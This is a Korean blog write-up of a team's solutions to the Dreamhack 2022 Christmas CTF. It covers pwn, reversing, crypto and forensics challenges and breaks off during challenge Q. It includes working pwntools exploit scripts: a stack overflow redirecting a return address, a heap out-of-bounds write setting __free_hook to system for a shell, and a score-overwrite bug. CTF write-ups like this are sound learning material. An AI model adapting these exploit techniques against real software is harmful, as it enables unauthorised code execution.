---
layout: post
category: writeup
---

<br><br>

This is a CTF that was held in 2022 Christmas on Dreamhack.
Sechack, Slyfizz and I ran as one team, and the collaboration was pretty excellent.
We even had a great final position(3rd), and unexpected prize.

It was a great experience for me.

This is Write-Up for the challenges from all 3 members in Korean.

### Team

Sechack여친구함

### Solved

Sechack: A, B, H, O, P, Q, S, U, W
rev4fun: D, E, F, I, N
soon_haari: G, K, L, M, R, V

<br><br><br>

# A - **Welcome**

![Untitled](../files/christmas%20ctf%202022%205793e210ad10417bab0c141efed21db1/Untitled.png)

ssh에 접속해보면 rbash셸로 접속되는걸 볼 수 있다. 그래서 /read_flag바이너리를 실행할 수 없다.

![Untitled](../files/christmas%20ctf%202022%205793e210ad10417bab0c141efed21db1/Untitled%201.png)

약간의 구글링 결과 이러한 솔루션을 얻을 수 있었다.

![Untitled](../files/christmas%20ctf%202022%205793e210ad10417bab0c141efed21db1/Untitled%202.png)

<br><br><br>

# B - **MSNW**

![Untitled](../files/christmas%20ctf%202022%205793e210ad10417bab0c141efed21db1/Untitled%203.png)

![Untitled](../files/christmas%20ctf%202022%205793e210ad10417bab0c141efed21db1/Untitled%204.png)

![Untitled](../files/christmas%20ctf%202022%205793e210ad10417bab0c141efed21db1/Untitled%205.png)

반복적으로 read와 write를 해주는걸 볼 수 있다. read할때 2byte overflow가 터지니까 그냥 스택 릭하고 sfp덮으면 된다. 오버플로 난 시점으로부터 함수 에필로그를 2번 거치니까 ret변조할 수 있다.

![Untitled](../files/christmas%20ctf%202022%205793e210ad10417bab0c141efed21db1/Untitled%206.png)

Win함수 있으니까 이걸로 변조하면 된다.

```python
from pwn import *

sla = lambda x, y : r.sendlineafter(x, y)
sa = lambda x, y : r.sendafter(x, y)
rvu = lambda x : r.recvuntil(x)

#r = process("./msnw")
r = remote("host3.dreamhack.games", 19028)

magic = 0x40135B

sa(": ", b"a"*0x130)

stack_leak = u64(rvu("\x7f")[-6:].ljust(8, b"\x00"))
log.info(hex(stack_leak))

sa(": ", p64(magic)*38+p16((stack_leak - 0x210) & 0xffff))

r.interactive()
```

![Untitled](../files/christmas%20ctf%202022%205793e210ad10417bab0c141efed21db1/Untitled%207.png)

<br><br><br>

# D - **locked present**

```python
plain=[0x61, 0x5F, 0x6D, 0x65, 0x72, 0x72, 0x79, 0x5F, 0x63, 0x68, 
0x72, 0x69, 0x73, 0x74, 0x6D, 0x61, 0x73, 0x5F, 0x66, 0x6F, 0x72,
 0x5F, 0x79, 0x6F, 0x75]
sbox=[{redacted}]

inp="abcdefghijklmnopqrstuvwxy"
plain=list(map(ord,inp))
keytable=[{redacted}]

def addroundkey(a1,a2):
	for i in range(5):
		for j in range(5):
			a2[i*5+j]^=keytable[a1*25+i*5+j]

def subbytes(a1):
	for i in range(len(a1)):
		a1[i]=sbox[a1[i]]

def re_subbytes(a1):
	for i in range(len(a1)):
		a1[i]=sbox.index(a1[i])

def shiftrows(a1):
	for i in range(5):
		for j in range(i):
			v4=a1[i]
			a1[i]=a1[i+5]
			a1[i+5]=a1[i+10]
			a1[i+10]=a1[i+15]
			a1[i+15]=a1[i+20]
			a1[i+20]=v4

def re_shiftrows(a1):
	out=[0]*25
	table=[0, 6, 12, 18, 24, 5, 11, 17, 23, 4, 10, 16, 22, 3, 9, 15, 21, 2, 8, 14, 
20, 1, 7, 13, 19]
	for i in range(len(a1)):
		out[table[i]]=a1[i]
	return out

addroundkey(0,plain)
for i in range(1,11,1):
	subbytes(plain)
	shiftrows(plain)
	addroundkey(i,plain)
encrypted=plain

encrypted=[0x37, 0xA6, 0xB2, 0x27, 0xAA, 0xBE, 0xDA, 0x06, 0xD8, 0x0F, 
0x4B, 0x36, 0x49, 0x95, 0x88, 0x32, 0x75, 0x80, 0x66, 0xA2, 0xD1, 0xEA, 
0x68, 0xE2, 0x0E]

for i in range(10,-1,-1):
	addroundkey(i,encrypted)
	if i==0:
		break
	encrypted=re_shiftrows(encrypted)
	re_subbytes(encrypted)

print("".join([chr(i)for i in encrypted]))
```

로직을 분석해보면 단순한 aes 암호를 구현한 것과 같다. 다만 mixcolumns 부분이 빠져있어서 해당 부분을 제외하고 구현해서 역함수 짜주면 풀린다.

### flag

```
DH{W0w_U_kn0w_4b0ut_AES?}
```

<br><br><br>

# E - **snow**

```python
enc=[0x97, 0x88, 0xA8, 0x86, 0x14, 0x0F, 0xE6, 0xF0, 0xE7, 0xF2, 0x92, 0x83, 
0x19, 0x7A, 0x19, 0x06, 0x6A, 0x7B, 0xE3, 0xF7, 0x6D, 0x7D, 0x96, 0x86, 0x1D,
 0x7A, 0x15, 0x7D, 0x1E, 0x7A, 0x6A, 0x42]
sss=[0x97, 0x88, 0x57, 0x5E, 0x4D, 0x5E, 0xB2, 0xA1, 0xB2, 0xA1, 0xB2, 0xA1, 
0x4D, 0x5E, 0xB2, 0xA1, 0x4D, 0x5E, 0xB2, 0xA1, 0x4D, 0x5E, 0x4D, 0x5E, 0x4D, 
0x5E, 0x4D, 0x5E, 0x4D, 0x5E, 0x4D, 0x42]

bb=[0xB2, 0xA1, 0x4D, 0x5E, 0x4D, 0x5E, 0x4D, 0x5E, 0x4D, 0x5E, 0xB2, 0xA1, 
0xB2, 0xA1, 0xB2, 0xA1, 0x4D, 0x5E, 0xB2, 0xA1, 0xB2, 0xA1, 0x4D, 0x5E, 0x4D, 
0x5E, 0x4D, 0x5E, 0x4D, 0x5E, 0x4D, 0x5E, 0x00, 0x10]
k=[]
for i in range(len(bb)):
	k.append(bb[i]^ord("a"))
flag=""
for i in range(len(enc)):
	m=enc[i]^k[i]
	if m>127:
		m=255-m
	flag+=chr(m)
print(flag)
```

함수가 복잡해 보이는데 해당 연산을 굳이 분석하지 않고도 단순한 xor을 이용한 암호화여서 간단하게 복구할 수 있다.

### flag

```python
DH{F805042AC5E59FD07ABEF1E9B2EF}
```

<br><br><br>

# F - **mixed box**

```python
sbox=[{redacted}]

def ROL(data, shift, size=32):
    shift %= size
    remains = data >> (size - shift)
    body = (data << shift) - (remains << size )
    return (body + remains)
    

def ROR(data, shift, size=32):
    shift %= size
    body = data >> shift
    remains = (data << (size - shift)) - (body << size)
    return (body + remains)

cmptable=[{redacted}]
form=b"DH{def84ijklmnopqrstuvwxyz0123456789AB}"

out=[]
xx=[]
kk=[]
import string
a=string.printable
b=list(map(ord,a))
for i in range(len(a)):
	xx.append(sbox[b[i]-1]^b[i])

for i in range(len(form)):
	kk.append(sbox[form[i]-1]^form[i])

def word(a1,a2):
	return (a1[a2+1]<<8|a1[a2])

def dword(a1,a2):
	return (a1[a2+3]<<24|a1[a2+2]<<16|a1[a2+1]<<8|a1[a2])

mm=0
count=0
out=[]

counttable=[]
while True:
	c=0x400000|(word(kk,mm))
	b=c>>count
	b=b&7
	bb=kk[b]
	out.append(bb)
	count+=3
	if count>8:
		count-=8
		mm+=1
	if mm==len(kk)-1:
		break

out.append(0)
count=0
mm=0

x=[]
for i in range(len(out)//4):
	v4=dword(out,i*4)
	v5=ROL(v4,1)
	v6 = (27 * ROR(v5 & 0x1010101, 8)) ^ v5 & 0xFEFEFEFE
	v7 = v6 ^ ROL(v6, 8)
	v8 = ROL(v4, 8)
	v9 = v8 ^ v7
	v10 = ROL(v8, 8)
	vv=ROL(v10, 8) ^ v10 ^ v9
	x.append(vv)
print([hex(i)for i in x])
```

복잡하게 구현된 코드를 전부 분석해보면 위와같은 모양의 로직을 얻어낼 수 있다.

sbox는 objdump를 이용하여 바이트를 쭉 뽑아내었다.  

이때 단순히 4바이트의 값을 이용하여 cmptable과 비교하는 아래쪽 부분의 경우 z3를 이용해서 올바른 값을 얻어낼 수 있다.

```python
from z3 import *
s=Solver()
def ROL(data, shift, size=32):
    shift %= size
    remains = data >> (size - shift)
    body = (data << shift) - (remains << size )
    return (body + remains)
    

def ROR(data, shift, size=32):
    shift %= size
    body = data >> shift
    remains = (data << (size - shift)) - (body << size)
    return (body + remains)
def word(a1,a2):
	return (a1[a2+1]<<8|a1[a2])

def dword(a1,a2):
	return (a1[a2+3]<<24|a1[a2+2]<<16|a1[a2+1]<<8|a1[a2])

arr=[BitVec("arr%i"%i,64)for i in range(41)]
for i in range(len(arr)):
	s.add(arr[i]<0x100000000)
	s.add(arr[i]>=0)
x=[]

for i in range(41):
	v4=arr[i]
	v5=ROL(v4,1)
	v6 = (27 * ROR(v5 & 0x1010101, 8)) ^ v5 & 0xFEFEFEFE
	v7 = v6 ^ ROL(v6, 8)
	v8 = ROL(v4, 8)
	v9 = v8 ^ v7
	v10 = ROL(v8, 8)
	vv=ROL(v10, 8) ^ v10 ^ v9
	x.append(vv)

cmptable=[{redacted}]
for i in range(len(cmptable)):
	s.add(x[i]==cmptable[i])
print(s.check())
m=s.model()
realout=[]
for i in range(len(m)):
	realout.append(int(str(m.evaluate(arr[i]))))
print(realout)
```

결과

```python
sat
[{redacted}]
```

그리고 이렇게 알게된 바이트의 hex값을 이용해서 sbox에 대입하면 플래그의 앞8자리를 구할 수 있다.

```python
DH{Sb0x,
```

이후 위쪽 부분을 해결해야하는데

이때 위쪽부분의 count와 mm의 횟수를 우선적으로 저장해놓고 위쪽 코드의 경우 

2바이트당 3개의 check값이 나오기에 이를 brute-force를 이용하여 구할 수 있다.

obvious는 각 아래 코드의 dword값들을 byte로 변환한 테이블이다.

```python
counttable=[{redacted}]
idxtable=[0xb9,0xef,0x1f,0xf6,0xce,0x42,0x96,0x37]

obvious=[{redacted}]

sbox=[{redacted}]
def word(a1,a2):
	return (a1[a2+1]<<8|a1[a2])

def dword(a1,a2):
	return (a1[a2+3]<<24|a1[a2+2]<<16|a1[a2+1]<<8|a1[a2])

mmtable=[{redacted}]
import string
import itertools
able=string.printable
form=b"DH{Sb0x,"
while True:
	for perm in itertools.product(able, repeat=2):
		aa="".join(perm)
		flag=form+bytes(aa,"utf-8")
		kk=[]
		for i in range(len(flag)):
			kk.append(sbox[flag[i]-1]^flag[i])
		out=[]
		i=0
		while True:
			c=0x400000|(word(kk,mmtable[i]))
			b=c>>counttable[i]
			b=b&7
			bb=kk[b]
			out.append(bb)
			i+=1
			if mmtable[i]==len(kk)-1:
				break
		if obvious[:len(out)]==out:
			print(form)
			print(len(out),len(obvious))
			form=flag[:-1]
			break
```

이런식으로 가능한 경우의 수를 이용하여 2바이트씩 브루트포스를 해주면 값이 쭉 나오게 된다.

![Untitled](../files/christmas%20ctf%202022%205793e210ad10417bab0c141efed21db1/Untitled%208.png)

}를 추가해주면

```
DH{Sb0x,Ba5e8+And_M1X#CoLUmN=/7T4IyQJhzfqp9YKrR6utOcGVFWw3Pk}
```

![Untitled](../files/christmas%20ctf%202022%205793e210ad10417bab0c141efed21db1/Untitled%209.png)

Correct!!

### flag

```
DH{Sb0x,Ba5e8+And_M1X#CoLUmN=/7T4IyQJhzfqp9YKrR6utOcGVFWw3Pk}
```

# G - where’s the box

decrypt된 값이 flag의 배수면 값을 알려주지 않는다. 

그래서 flag * k = n + result (result < n)인 k의 값을 이분탐색으로 찾으면 된다. 

ex.py

```python
from pwn import *
from Crypto.Util.number import *
import time

r = remote("host1.dreamhack.games", 10852)

r.sendlineafter("[3] Get info\n", "3")

n = int(r.recvline()[3:])
g = int(r.recvline()[3:])
ct = int(r.recvline()[6:])

high = n
low = 1

while 1:
	mid = (high + low) // 2
	send_ct = pow(ct, mid, n ** 2)
	send = bytes.hex(long_to_bytes(send_ct))
	print(high)
	print(low)
	print()

	r.sendlineafter("[3] Get info", "2")
	r.sendlineafter("Input ciphertext (hex): ", send)

	res = r.recvline()
	
	if res[:1] == b'D':
		low = mid
		continue
	else:
		high = mid

	if (n + int(res)) % mid == 0:
		flag = long_to_bytes((n + int(res)) // mid)
		print(flag)
		break

r.interactive()
```

flag

```
DH{under_the_tree_at_///hobble.runner.flap}
```

<br><br><br>

# H - **Santa claus is coming to town**

```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  int v3; // [rsp+8h] [rbp-1B8h] BYREF
  int v4; // [rsp+Ch] [rbp-1B4h]
  __int64 v5; // [rsp+10h] [rbp-1B0h] BYREF
  __int64 v6; // [rsp+18h] [rbp-1A8h] BYREF
  _DWORD s[102]; // [rsp+20h] [rbp-1A0h] BYREF
  unsigned __int64 v8; // [rsp+1B8h] [rbp-8h]

  v8 = __readfsqword(0x28u);
  init(argc, argv, envp);
  v3 = 0;
  v4 = 0;
  v5 = 0LL;
  v6 = 0LL;
  memset(s, 0, 0x190uLL);
  intro();
  while ( 1 )
  {
    while ( 1 )
    {
      print_menu();
      v3 = 0;
      __isoc99_scanf("%d", &v3);
      if ( v3 == 2 )
        break;
      if ( v3 == 3 )
      {
        if ( (unsigned int)santa_came(s) )
        {
          puts("Santa Claus : Oh... You're such an honest kid.");
          puts("Santa Claus : Tell me if you have any memories you want to change and erase in this year.");
          v4 = check_offset();
          if ( !v4 )
            exit(0);
          printf("what line you edit : ");
          __isoc99_scanf("%ld", &v6);
          if ( v6 < 0 )
          {
            puts("Wrong input");
            exit(0);
          }
          printf("Change memories to : ");
          read(0, (void *)(16 * (v6 - 1) + *(_QWORD *)&s[4 * v4 + 2]), 0x10uLL);
          free(*(void **)&s[4 * v4 + 2]);
          exit(0);
        }
        puts("Santa Claus just left...");
        exit(0);
      }
      if ( v3 == 1 )
      {
        v4 = check_offset();
        if ( v4 )
        {
          if ( v4 == s[4 * v4] )
          {
            puts("You already wrote.");
          }
          else
          {
            s[4 * v4] = v4;
            printf("How many lines will to write? (1 line = 16 words) : ");
            __isoc99_scanf("%ld", &v5);
            s[4 * v4 + 1] = v5;
            *(_QWORD *)&s[4 * v4 + 2] = malloc(16 * v5);
            puts("\n~~~~~~~~~~contents~~~~~~~~~~");
            read(0, *(void **)&s[4 * v4 + 2], 16 * v5 - 1);
          }
        }
      }
      else
      {
        puts("Wrong input");
      }
    }
    v4 = check_offset();
    if ( v4 )
    {
      if ( s[4 * v4] )
      {
        printf("\nPages : %p\n", *(const void **)&s[4 * v4 + 2]);
        printf("Contents : %s", *(const char **)&s[4 * v4 + 2]);
      }
      else
      {
        puts("You haven't written yet.");
      }
    }
  }
}
```

main함수를 보면 메모 쓰는 기능과 읽는 기능이 있는걸 볼 수 있다.

![Untitled](../files/christmas%20ctf%202022%205793e210ad10417bab0c141efed21db1/Untitled%2010.png)

또다른 기능 하나는 수정하는 기능인데 santa_came함수가 1을 반환해야 사용할 수 있다. 1을 반환하려면 24개의 메모가 꽉 채워져 있으면 된다.

![Untitled](../files/christmas%20ctf%202022%205793e210ad10417bab0c141efed21db1/Untitled%2011.png)

그리고 이 기능에서 입력받는 offset이 0보다 작은지만 검증해서 oob가 터지는걸 볼 수 있다. 메모가 할당된 청크의 주소도 그냥 주니까 매우 크게 할당해서 mmap으로 할당하게 하면 mmap된 주소랑 libc주소랑 offset이 일정하다는걸 이용해서 libc leak할 수 있고 oob로 aaw하면 끝난다.

```python
from pwn import *

#context.log_level = "debug"

sla = lambda x, y : r.sendlineafter(x, y)
sa = lambda x, y : r.sendafter(x, y)
rvu = lambda x : r.recvuntil(x)
rv = lambda x : r.recv(x)

#r = process(["./santa_coming_to_town"], env={"LD_PRELOAD":"./libc"})
r = remote("host1.dreamhack.games", 15291)

def wr(idx, bsize, data):
    sla(">> ", "1")
    sla(": ", str(idx))
    sla(": ", str(bsize))
    sa("~\n", data)

def re(idx):
    sla(">> ", "2")
    sla(": ", str(idx))

def sle(idx, offset, data):
    sla(">> ", "3")
    sla("it? : ", str(idx))
    sla("edit : ", str(offset))
    sa("to : ", data)

wr(1, 0x3000, b"/bin/sh\x00")
for i in range(2, 26):
    wr(i, 1, b"/bin/sh\x00")

re(1)

rvu("Pages : ")
libc_leak = int(rv(14), 16)
libc_base = libc_leak - 0x5e5010
free_hook = libc_base + 0x3ed8e8
system = libc_base + 0x4f420
log.info(hex(libc_base))

re(2)

rvu("Pages : ")
heap_leak = int(rv(14), 16)

sle(2, (free_hook - heap_leak)//0x10+1, p64(system)*2)

r.interactive()
```

![Untitled](../files/christmas%20ctf%202022%205793e210ad10417bab0c141efed21db1/Untitled%2012.png)

Dockerfile빌드해서 해도 힙 오프셋 좀 안맞아서 삽질했다. 그냥 0x1000씩 더하고빼면서 브포해보면 금방 나온다.

<br><br><br>

# I - **Block Cipher**

[https://scratch.mit.edu/projects/editor/?tutorial=getStarted](https://scratch.mit.edu/projects/editor/?tutorial=getStarted)

여기 링크 들어가서 문제파일을 올리면

![Untitled](../files/christmas%20ctf%202022%205793e210ad10417bab0c141efed21db1/Untitled%2013.png)

스크래치로 문제파일이 변환이 된다.

중간중간에 wait로 대기를 걸고 레지스터 값을 확인할 수 있어서 이를 이용해서 분석한 뒤에 이를 전부 코드로 옮겼다.

```python
rk=[{redacted}]

hf0=[{redacted}]

hf1=[{redacted}]

inp=[61,62,63,64,65,66,67,67]
data=inp
stack=[]
def t6768():
	r9=stack[-1]
	stack[-1]=bin(r9)

def e44a():
	r9=stack[len(stack)-2]
	r10=stack[-1]
	stack.pop()
	stack.pop()
	stack.append(r10)
	stack.append(r9)

def y67r():
	r9=stack[len(stack)-2]
	r10=stack[-1]
	stack.pop()
	stack.pop()
	stack.append(r9^r10)

def g1143():
	r8=stack[-1]
	stack.pop()
	r7=stack[-1]
	stack.pop()
	r6=stack[-1]
	stack.pop()
	r5=stack[-1]
	stack.pop()
	r4=stack[-1]
	stack.pop()
	r3=stack[-1]
	stack.pop()
	r2=stack[-1]
	stack.pop()
	r1=stack[-1]
	stack.pop()
	r0=stack[-1]
	stack.pop()
	stack.append((hf0[xx[r2-1]]+rk[((r0*4)+3)])%256)
	stack.append(xx[r1-1])
	y67r()
	xx[r1-1]=stack[-1]
	stack.pop()
	stack.append(hf1[xx[r4-1]])
	stack.append(rk[r0*4+2])
	y67r()
	xx[r3-1]=((xx[r3-1]+stack[-1])%256)
	stack.pop()
	stack.append((hf0[xx[r6-1]]+rk[((r0*4)+1)])%256)
	stack.append(xx[r5-1])
	y67r()
	xx[r5-1]=stack[-1]
	stack.pop()
	stack.append(hf1[xx[r8-1]])
	stack.append(rk[r0*4-1+1])
	y67r()
	xx[r7-1]=((xx[r7-1]+stack[-1])%256)
	stack.pop()

	

xx=[0]*8
for i in range(4):
	xx[2*i+1]=data[2*i+1]
xx[0]=(data[0]+rk[0])%256
stack.append(data[2])
stack.append(rk[1])
y67r()
xx[2]=stack[-1]
stack.pop()
xx[4]=data[4]+rk[2]%256
stack.append(data[6])
stack.append(rk[3])
y67r()
xx[6]=stack[-1]
stack.pop()
r0=[2,8,7,6,5,4,3,2,1]
stack=r0
g1143()
r0=[3,7,6,5,4,3,2,1,8]
stack=r0
g1143()
r0=[4,6,5,4,3,2,1,8,7]
stack=r0
g1143()
r0=[5,5,4,3,2,1,8,7,6]
stack=r0
g1143()
r0=[6,4,3,2,1,8,7,6,5]
stack=r0
g1143()
r0=[7,3,2,1,8,7,6,5,4]
stack=r0
g1143()
r0=[8,2,1,8,7,6,5,4,3]
stack=r0
g1143()
###################
for i in range(4):
	data[2*i+1]=xx[(2*i+2)%8]

data[0]=(xx[1]+rk[4])%256
stack.append(xx[3])
stack.append(rk[5])
y67r()
data[2]=stack[-1]
stack.pop()
data[4]=(xx[5]+rk[6])%256
stack.append(xx[7])
stack.append(rk[7])
y67r()
data[6]=stack[-1]
stack.pop()

print(xx)
print(data)
```

그럼 위와 같은 로직임을 알 수 있는데 이는 생각외로 손실되는 비트가 없어서 역연산이 쉽게 된다. 

```python
rk=[{redacted}]

hf0=[{redacted}]

hf1=[{redacted}]
data=[148,200,182,215,76,96,151,136]
xx=[0]*8

def re_g1143():
	r8=stack[-1]
	stack.pop()
	r7=stack[-1]
	stack.pop()
	r6=stack[-1]
	stack.pop()
	r5=stack[-1]
	stack.pop()
	r4=stack[-1]
	stack.pop()
	r3=stack[-1]
	stack.pop()
	r2=stack[-1]
	stack.pop()
	r1=stack[-1]
	stack.pop()
	r0=stack[-1]
	stack.pop()
	a=(hf0[xx[r2-1]]+rk[((r0*4)+3)])%256
	xx[r1-1]^=a
	a=hf1[xx[r4-1]]
	b=rk[r0*4+2]
	c=a^b
	xx[r3-1]=(xx[r3-1]-c)%256
	a=(hf0[xx[r6-1]]+rk[((r0*4)+1)])%256
	xx[r5-1]^=a
	a=hf1[xx[r8-1]]
	b=rk[r0*4-1+1]
	c=a^b
	xx[r7-1]=(xx[r7-1]-c)%256

for i in range(4):
	xx[(2*i+2)%8]=data[2*i+1]
xx[1]=(data[0]-rk[4])%256
xx[3]=rk[5]^data[2]
xx[5]=(data[4]-rk[6])%256
xx[7]=rk[7]^data[6]

r0=[8,2,1,8,7,6,5,4,3]
stack=r0
re_g1143()

r0=[7,3,2,1,8,7,6,5,4]
stack=r0
re_g1143()

r0=[6,4,3,2,1,8,7,6,5]
stack=r0
re_g1143()
r0=[5,5,4,3,2,1,8,7,6]
stack=r0
re_g1143()
r0=[4,6,5,4,3,2,1,8,7]
stack=r0
re_g1143()
r0=[3,7,6,5,4,3,2,1,8]
stack=r0
re_g1143()
r0=[2,8,7,6,5,4,3,2,1]
stack=r0
re_g1143()

data[6]=xx[6]^rk[3]
data[4]=(xx[4]-rk[2])%256
data[2]=xx[2]^rk[1]
data[0]=(xx[0]-rk[0])%256

for i in range(4):
	data[2*i+1]=xx[2*i+1]
print(data)
```

이렇게 역연산을 작성하고

```python
22,53,9,18,95,37,57,61
```

 scratch에 결과를 넣어주면

![Untitled](../files/christmas%20ctf%202022%205793e210ad10417bab0c141efed21db1/Untitled%2014.png)

맞다고 나온다.

### flag

```python
DH{22,53,9,18,95,37,57,61}
```

<br><br><br>

# K - find a gift

이진 트리의 1024개의 노드를 다 돌아보면 된다. 

i번째 노드를 방문할 때는 i // 2, i를 방문하면 된다. 

ex.py

```python
from pwn import *
import time

r = remote("host3.dreamhack.games", 13431)

r.recvline()

for i in range(2, 1024):
	r.sendlineafter("---\naddress : ", str(i // 2))
	r.sendlineafter("---\naddress : ", str(i))
	print(f"{i}: {r.recvline()}")

r.interactive()
```

flag

```
DH{Yeah!! I found a Christmas gift box!!}
```

<br><br><br>

# L - Collatz conjecture

홀수면 3k + 1, 짝수면 k / 2가 되는 과정을 구현해 놓았고, 마지막에 1로 수렴하게 되면 실패이다. 

int64로 구현되어 있기 때문에 (2^64 - 1) / 3을 집어넣어주면 풀린다. 

```
DH{Collatz_Conjecture_1s_FALSE____Proof_by_AC}
```

<br><br><br>

# M - the present

prng가 제곱을 해주는 연산만을 진행해준다. 

모듈러 내에서 제곱근을 두 번 실행해주면 된다. 

물론 가능한 경우의 수를 다 실행해주어야 한다. 

ex.sage

```python
from Crypto.Util.number import *

M = 12045184283108733282877246918018456795629932264538806786957088609817236359725183272225617590814403324378457302095025664842376149624271113548645334599894051
rand = 321609188014782817530081099017386870899897457530475334351599692725892773281779472409503390776505529932157130216692885548245652532540341302761980076422023

m1 = Mod(rand, M).sqrt()
m2 = -m1

m = m2.sqrt()
print(long_to_bytes(int(m)))
print(long_to_bytes(int(-m)))
```

flag

```
DH{M3rry_ChrI5tM4s_And_4_h4pPy_N3w_y34R_3verY0n3}
```

<br><br><br>

# N - **lolololologfile**

ftk imager를 이용해서 주어진 파일을 열어주면

![Untitled](../files/christmas%20ctf%202022%205793e210ad10417bab0c141efed21db1/Untitled%2015.png)

unallocated space에 위와 같은 파일들이 있다. 이를 추출해서 하나로 합쳐주면 

![Untitled](../files/christmas%20ctf%202022%205793e210ad10417bab0c141efed21db1/Untitled%2016.png)

산타와 함께 플래그가 나온다.

### flag

```python
DH{1_lov3_For3NSiCS_Not_FOur_AND_six}
```

<br><br><br>

# O - **Broken Tetris**

코드 양이 많아서 쫄았지만 취약점은 생각보다 간단했다.

![Untitled](../files/christmas%20ctf%202022%205793e210ad10417bab0c141efed21db1/Untitled%2017.png)

게임이 끝날때마다 스코어보드에 이름이랑 점수를 올려주는데 ranking_idx에 대한 검증이 없어서 단순히 게임을 많이 하게 되면 oob가 발생하게 된다.

덮을 수 있는곳중에 가장 유용한 곳은

![Untitled](../files/christmas%20ctf%202022%205793e210ad10417bab0c141efed21db1/Untitled%2018.png)

테트로미노 정보를 저장하고 있는 이곳이다. 아무래도 게임을 구현한거다보니까 제대로 분석하기가 꺼려져서 그냥 20번정도 돌려봤더니 세그폴트가 떴고 어디서 어떻게 뜨는지 분석해봤더니

![Untitled](../files/christmas%20ctf%202022%205793e210ad10417bab0c141efed21db1/Untitled%2019.png)

tg_set함수에서 row와 column값을 맘대로 조작할 수 있었다. 우리가 입력한 값으로 row와 column, value가 조작되어 있길래 무슨일인가 싶어서 해당 함수를 부르는 부분을 봤다.

![Untitled](../files/christmas%20ctf%202022%205793e210ad10417bab0c141efed21db1/Untitled%2020.png)

tg_set함수를 부르는 부분들을 보면 우리가 덮어쓴 TETROMINOS를 참조해서 인자로 가공하는걸 볼 수 있다. 따라서 TETROMINOS의 어느 부분이 참조가 되는지 동적 분석으로 정확히 알아냈고 잘 덮어주면 row, column을 조작할 수 있고 tg_set함수에서 2차 oob를 낼 수 있게 된다. tetris_game구조체는 우리의 게임 점수도 담고 있으므로 oob로 offset잘 맞춰서 게임 점수부분 참조하게 만들어 주고 (6번째 바이트를 참조했던걸로 기억한다.) 4번째 인자로 TC_EMPTY가 전달되면 0이 덮이게 되어서 점수가 안오르니까 tg_put부분으로 tg_set을 불러서 4번째 인자가 TYPE_TO_CELL(block.typ)로 들어가게끔 해준다. 이렇게 잘 조작해서 부르면 현재 스코어의 6번째 바이트가 1로 덮이게 되면서 매우 큰 값이 된다. 이때 게임을 종료해주면

![Untitled](../files/christmas%20ctf%202022%205793e210ad10417bab0c141efed21db1/Untitled%2021.png)

종료 부분 로직으로 인해서 get_flag함수가 불리고

![Untitled](../files/christmas%20ctf%202022%205793e210ad10417bab0c141efed21db1/Untitled%2022.png)

여기선 스코어가 ranking_list[0].score보다 클경우에만 플래그를 주는걸 볼 수 있다.

![Untitled](../files/christmas%20ctf%202022%205793e210ad10417bab0c141efed21db1/Untitled%2023.png)

고작해야 3000점인데 우리는 oob를 이용해서 점수의 6번째 바이트를 1로 덮었으니까 점수가 엄청나게 큰 값이 되어있을거고 플래그를 얻을 수 있게 된다.

```python
from pwn import *

#context.log_level = "debug"

sla = lambda x, y : r.sendlineafter(x, y)
sa = lambda x, y : r.sendafter(x, y)
s = lambda x : r.send(x)
rvu = lambda x : r.recvuntil(x)
rv = lambda x : r.recv(x)

#r = process("./prob", stdout=PTY, stdin=PTY)
r = remote("host3.dreamhack.games", 21255)

for i in range(20):
    sla("> ", "1")
    s("q")
    sa("name : ", p32(0xfffffff9)*14)

sla("> ", "1")
s("q")

r.interactive()
```

<br><br><br>

# P - **Windows Search**

Windows.edb파일 하나만 준다. 약간의 구글링으로 저 파일을 분석하는 도구를 찾을 수 있었고 다운받아서 열어보았다.

![Untitled](../files/christmas%20ctf%202022%205793e210ad10417bab0c141efed21db1/Untitled%2024.png)

파일탐색기 같이 생겼는데 위에 검색기능 있으니까 flag.txt를 검색해보았다.

![Untitled](../files/christmas%20ctf%202022%205793e210ad10417bab0c141efed21db1/Untitled%2025.png)

하나가 나오는걸 볼 수 있다.

![Untitled](../files/christmas%20ctf%202022%205793e210ad10417bab0c141efed21db1/Untitled%2026.png)

나온 파일 더블클릭해서 옆에 뜨는 요소들 뒤적거리다 보면 플래그가 나온다.

<br><br><br>

# Q - **Kind kid list**

```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  char *v3; // rsi
  char *v4; // rdi
  __int64 v5; // rdx
  __int64 v6; // rcx
  __int64 v7; // r8
  __int64 v8; // r9
  const char *v9; // rsi
  __int64 v10; // rdx
  __int64 v11; // rcx
  __int64 v12; // r8
  __int64 v13; // r9
  char s2[8]; // [rsp+0h] [rbp-E0h] BYREF
  __int64 v15; // [rsp+8h] [rbp-D8h]
  char v16[8]; // [rsp+10h] [rbp-D0h] BYREF
  __int64 v17; // [rsp+18h] [rbp-C8h]
  char dest[8]; // [rsp+20h] [rbp-C0h] BYREF
  __int64 v19; // [rsp+28h] [rbp-B8h]
  char v20[132]; // [rsp+30h] [rbp-B0h] BYREF
  char src[8]; // [rsp+B4h] [rbp-2Ch] BYREF
  int v22; // [rsp+BCh] [rbp-24h] BYREF
  FILE *stream; // [rsp+C0h] [rbp-20h]
  void *ptr; // [rsp+C8h] [rbp-18h]
  int v25; // [rsp+D4h] [rbp-Ch]
  int v26; // [rsp+D8h] [rbp-8h]
  int i; // [rsp+DCh] [rbp-4h]

  init(argc, argv, envp);
  intro();
  i = 0;
  v25 = 0;
  v22 = 0;
  v26 = 0;
  *(_QWORD *)src = 0x6E7233767977LL;
  memset(v20, 0, 0x80uLL);
  *(_QWORD *)dest = 0LL;
  v19 = 0LL;
  *(_QWORD *)v16 = 0LL;
  v17 = 0LL;
  *(_QWORD *)s2 = 0LL;
  v15 = 0LL;
  ptr = malloc(8uLL);
  stream = fopen("/dev/urandom", "r");
  fread(ptr, 7uLL, 1uLL, stream);
  v3 = src;
  v4 = dest;
  strcpy(dest, src);
  while ( 1 )
  {
    menu(v4, v3, v5, v6, v7, v8);
    fflush(stdout);
    v3 = (char *)&v22;
    v4 = "%d";
    __isoc99_scanf("%d", &v22);
    if ( v22 == 3 )
      break;
    if ( v22 <= 3 )
    {
      if ( v22 == 1 )
      {
        puts("\n-Kind kid list-");
        for ( i = 0; i <= 5; ++i )
          puts(&v20[16 * i]);
        puts("\n-Naughty kid list-");
        for ( i = 0; i <= 7; ++i )
          putchar(dest[i]);
        v4 = (char *)&byte_2072;
        puts(&byte_2072);
      }
      else if ( v22 == 2 )
      {
        printf("\nPassword : ");
        fflush(stdout);
        __isoc99_scanf("%8s", s2);
        v3 = s2;
